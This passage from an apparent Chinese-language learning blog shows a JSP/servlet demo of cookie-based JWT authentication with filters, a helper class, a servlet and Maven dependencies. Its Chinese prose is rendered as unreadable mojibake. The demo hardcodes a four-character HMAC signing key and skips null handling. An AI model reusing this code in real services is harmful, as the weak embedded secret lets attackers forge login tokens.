<p>ç®€å•åœ°ä½¿ç”¨ <code>cookie</code> + <code>jwt</code> ä¾é è¿‡æ»¤å™¨åšèº«ä»½è®¤è¯ã€‚</p>
<h5 id="å®ç°-2">- å®ç° -</h5>
<p>ç”Ÿæˆé¡µé¢ <code>generate.jsp</code> ğŸ‘‡</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Generate&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=<span class="string">&quot;core&quot;</span> target=<span class="string">&quot;_self&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">    &lt;input hidden=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;action&quot;</span> value=<span class="string">&quot;generate&quot;</span>/&gt;</span><br><span class="line">    &lt;p&gt; ç”¨æˆ·å &lt;/p&gt;&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;username&quot;</span>/&gt;</span><br><span class="line">    &lt;hr&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;ç”Ÿæˆ&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>ä¿¡æ¯é¡µé¢ <code>info.jsp</code> ğŸ‘‡</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Info&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h3&gt;ç”¨æˆ·å: &lt;%=request.getAttribute(<span class="string">&quot;username&quot;</span>)%&gt;&lt;/h3&gt;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line">&lt;a href=<span class="string">&quot;clear.jsp&quot;</span>&gt;æ¸…ç©ºjwt&lt;/a&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>æ¸…é™¤é¡µé¢ <code>clear.jsp</code> ğŸ‘‡</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Clear&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;jsp:forward page=<span class="string">&quot;core&quot;</span>&gt;</span><br><span class="line">    &lt;jsp:param name=<span class="string">&quot;action&quot;</span> value=<span class="string">&quot;clear&quot;</span> /&gt;</span><br><span class="line">&lt;/jsp:forward&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>åŒ…è£…å¥½çš„ <code>Jwt</code> ç±»ğŸ‘‡</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> custom;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> io.jsonwebtoken.Claims;</span><br><span class="line"><span class="keyword">import</span> io.jsonwebtoken.Jwts;</span><br><span class="line"><span class="keyword">import</span> io.jsonwebtoken.SignatureAlgorithm;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.timer.Timer;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.UUID;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Jwt</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">private</span> String key = <span class="string">&quot;dqv5&quot;</span>;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">private</span> String signer = <span class="string">&quot;morouu&quot;</span>;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">private</span> <span class="keyword">long</span> endTime = <span class="number">30</span> * Timer.ONE_MINUTE;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">generate</span><span class="params">(Map&lt;String, Object&gt; map, SignatureAlgorithm sign)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">long</span> nowTime = System.currentTimeMillis();</span><br><span class="line"></span><br><span class="line">        Date now = <span class="keyword">new</span> Date(nowTime);</span><br><span class="line">        Date end = <span class="keyword">new</span> Date(nowTime + endTime);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> Jwts.builder()</span><br><span class="line">                .addClaims(map)</span><br><span class="line">                .setId(UUID.randomUUID().toString())</span><br><span class="line">                .setIssuedAt(now)</span><br><span class="line">                .setExpiration(end)</span><br><span class="line">                .setSubject(signer)</span><br><span class="line">                .signWith(sign,key)</span><br><span class="line">                .compact();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Claims <span class="title">parse</span><span class="params">(String token)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Jwts.parser()</span><br><span class="line">                .setSigningKey(key)</span><br><span class="line">                .parseClaimsJws(token)</span><br><span class="line">                .getBody();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å¤„ç†ç¼–ç çš„ <code>filter</code> ğŸ‘‡</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.jwtmanage;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebFilter;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebFilter(filterName = &quot;textFilter&quot;, value = &#123;&quot;/*&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">textFilter</span> <span class="keyword">implements</span> <span class="title">Filter</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">        request.setCharacterEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        response.setContentType(<span class="string">&quot;text/html;charset=UTF-8&quot;</span>);</span><br><span class="line">        chain.doFilter(request,response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å¤„ç†è®¤è¯çš„ <code>filter</code> ğŸ‘‡</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.jwtmanage;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> io.jsonwebtoken.Claims;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebFilter;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.Cookie;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebFilter(filterName = &quot;jwtFilter&quot;, value = &#123;&quot;/info.jsp&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">jwtFilter</span> <span class="keyword">implements</span> <span class="title">Filter</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line"></span><br><span class="line">        Cookie[] cookies = ((HttpServletRequest)request).getCookies();</span><br><span class="line">        String user = <span class="string">&quot;èº«ä»½é”™è¯¯ï¼&quot;</span>;</span><br><span class="line">        Claims claims;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(Cookie c : cookies)&#123;</span><br><span class="line">            <span class="keyword">if</span>(c.getName().equals(<span class="string">&quot;Jwt&quot;</span>))&#123;</span><br><span class="line">                claims = custom.Jwt.parse(c.getValue());</span><br><span class="line">                <span class="keyword">if</span>(claims != <span class="keyword">null</span>)&#123;</span><br><span class="line">                    user = (String)claims.get(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        request.setAttribute(<span class="string">&quot;username&quot;</span>,user);</span><br><span class="line"></span><br><span class="line">        chain.doFilter(request,response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å¤„ç†é€»è¾‘çš„ <code>servlet</code> ğŸ‘‡</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.jwtmanage;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> io.jsonwebtoken.SignatureAlgorithm;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.timer.Timer;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.Cookie;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Locale;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(name = &quot;core&quot;, value = &quot;/core&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">coreServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">generate</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        String user = req.getParameter(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(user == <span class="keyword">null</span>)&#123;</span><br><span class="line">            resp.getWriter().write(<span class="string">&quot;ç”¨æˆ·åä¸ºç©ºï¼å°†åœ¨ 3 ç§’åè¿”å›ç”Ÿæˆé¡µé¢ï¼&quot;</span>);</span><br><span class="line">            resp.setHeader(<span class="string">&quot;refresh&quot;</span>,<span class="string">&quot;3;url=generate.jsp&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Map&lt;String,Object&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;username&quot;</span>,user);</span><br><span class="line"></span><br><span class="line">        String jwt = custom.Jwt.generate(map, SignatureAlgorithm.HS256);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Cookie cookie = <span class="keyword">new</span> Cookie(<span class="string">&quot;Jwt&quot;</span>,jwt);</span><br><span class="line">        cookie.setHttpOnly(<span class="keyword">true</span>);</span><br><span class="line">        cookie.setMaxAge((<span class="keyword">int</span>) (Timer.ONE_MINUTE * <span class="number">30</span>));</span><br><span class="line"></span><br><span class="line">        resp.addCookie(cookie);</span><br><span class="line"></span><br><span class="line">        resp.getWriter().write(<span class="string">&quot;ç”ŸæˆJwtæˆåŠŸï¼è¯·ç‚¹å‡» &quot;</span>);</span><br><span class="line">        resp.getWriter().write(<span class="string">&quot;&lt;a href=\&quot;info.jsp\&quot;&gt; è¿™é‡Œ &lt;/a&gt;&quot;</span>);</span><br><span class="line">        resp.getWriter().write(<span class="string">&quot; æŸ¥çœ‹ä¿¡æ¯ï¼Œæˆ–ç‚¹å‡» &quot;</span>);</span><br><span class="line">        resp.getWriter().write(<span class="string">&quot;&lt;a href=\&quot;clear.jsp\&quot; è¿™é‡Œ &lt;/a&gt;&quot;</span>);</span><br><span class="line">        resp.getWriter().write(<span class="string">&quot;æ¸…é™¤Jwtï¼&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">clear</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line"></span><br><span class="line">        Cookie[] cookies = req.getCookies();</span><br><span class="line">        <span class="keyword">for</span>(Cookie c : cookies)&#123;</span><br><span class="line">            <span class="keyword">if</span>(c.getName().equals(<span class="string">&quot;Jwt&quot;</span>))&#123;</span><br><span class="line">                c.setMaxAge(<span class="number">0</span>);</span><br><span class="line">                resp.addCookie(c);</span><br><span class="line">                resp.getWriter().write(<span class="string">&quot;æ¸…é™¤JwtæˆåŠŸï¼å°†åœ¨ 3 ç§’åè¿”å›ç”Ÿæˆé¡µé¢ï¼&quot;</span>);</span><br><span class="line">                resp.setHeader(<span class="string">&quot;refresh&quot;</span>,<span class="string">&quot;3;url=generate.jsp&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        resp.getWriter().write(<span class="string">&quot;æœªæ‰¾åˆ°Jwtå†…å®¹ï¼å°†åœ¨ 3 ç§’åè¿”å›ç”Ÿæˆé¡µé¢ï¼&quot;</span>);</span><br><span class="line">        resp.setHeader(<span class="string">&quot;refresh&quot;</span>,<span class="string">&quot;3;url=generate.jsp&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        String action = req.getParameter(<span class="string">&quot;action&quot;</span>);</span><br><span class="line">        <span class="keyword">boolean</span> success = <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">if</span>(action != <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">&quot;generate&quot;</span>.equals(action.toLowerCase(Locale.ROOT))) &#123;</span><br><span class="line">                generate(req, resp);</span><br><span class="line">                success = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!success) &#123;</span><br><span class="line">            resp.getWriter().write(<span class="string">&quot;å‚æ•°é”™è¯¯ï¼&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        String action = req.getParameter(<span class="string">&quot;action&quot;</span>);</span><br><span class="line">        <span class="keyword">boolean</span> success = <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">if</span>(action != <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">&quot;clear&quot;</span>.equals(action.toLowerCase(Locale.ROOT))) &#123;</span><br><span class="line">                clear(req, resp);</span><br><span class="line">                success = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!success) &#123;</span><br><span class="line">            resp.getWriter().write(<span class="string">&quot;å‚æ•°é”™è¯¯ï¼&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>ä»¥åŠ <code>pom.xml</code> çš„ä¾èµ–é…ç½®ğŸ‘‡</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.jsonwebtoken<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jjwt<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.9.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.xml.bind<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jaxb-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.4.0-b180830.0359<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.sun.xml.bind<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jaxb-impl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.0.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.sun.xml.bind<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jaxb-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.0.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.activation<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>activation<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.1.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h5 id="æµ‹è¯•-2">- æµ‹è¯• -</h5>
<p><code>ç”Ÿæˆé¡µé¢</code> ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202241939057.png" alt="image-20220224193938915"></p>
<p>ç‚¹å‡»ç”ŸæˆåğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202241940349.png" alt="image-20220224194055169"></p>
<p><code>ä¿¡æ¯é¡µé¢</code> ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202241941845.png" alt="image-20220224194116678"></p>
<p><code>æ¸…é™¤é¡µé¢</code> ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202241941753.png" alt="image-20220224194130604"></p>
<h2 id="æ€»ç»“">- æ€»ç»“ -</h2>
<p>å¯ç®—æ˜¯è¿‡äº†ä¸€éåŸºç¡€ï¼Œçœ‹äº†ä¸‹åé¢è¿˜æœ‰å¾ˆå¤šä¸œè¥¿å¾—å­¦ã€‚ä¸è¿‡æ— è®ºå¦‚ä½•å…ˆæŠŠåŸºç¡€æ‰“å¥½äº†æ‰æ˜¯æœ€é‡è¦çš„ï¼Œç»§ç»­å¾€ä¸‹å­¦å§ã€‚</p>
<h2 id="å‚è€ƒ">- å‚è€ƒ -</h2>
<ul>
<li><a target="_blank" rel="noopener" href="http://c.biancheng.net/view/3980.html">http://c.biancheng.net/view/3980.html</a></li>
<li><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/">https://www.w3cschool.cn/jsp/</a></li>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/whgk/p/6399262.html">https://www.cnblogs.com/whgk/p/6399262.html</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/Forward__/article/details/57079115">https://blog.csdn.net/Forward__/article/details/57079115</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/gehulushang/article/details/88783570">https://blog.csdn.net/gehulushang/article/details/88783570</a></li>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/jiangfeilong/p/10710273.html">https://www.cnblogs.com/jiangfeilong/p/10710273.html</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_37651267/article/details/90962152">https://blog.csdn.net/qq_37651267/article/details/90962152</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/u011024652/article/details/52293932">https://blog.csdn.net/u011024652/article/details/52293932</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_37138756/article/details/103499429">https://blog.csdn.net/qq_37138756/article/details/103499429</a></li>
</ul>


        <hr>
        <!-- Pager -->
        <ul class="pager">
          
          
          <li class="next">
            <a href="/posts/320531414/" data-toggle="tooltip" data-placement="top" title="å­¦ä¹ ç¬”è®° - javaååºåˆ—åŒ–(ä¸€)">Next Post &rarr;</a>
          </li>
          
        </ul>

        
        <!-- tip start -->
        <!-- tip -->
<!-- tip start -->
<div class="tip">
  <p>
    
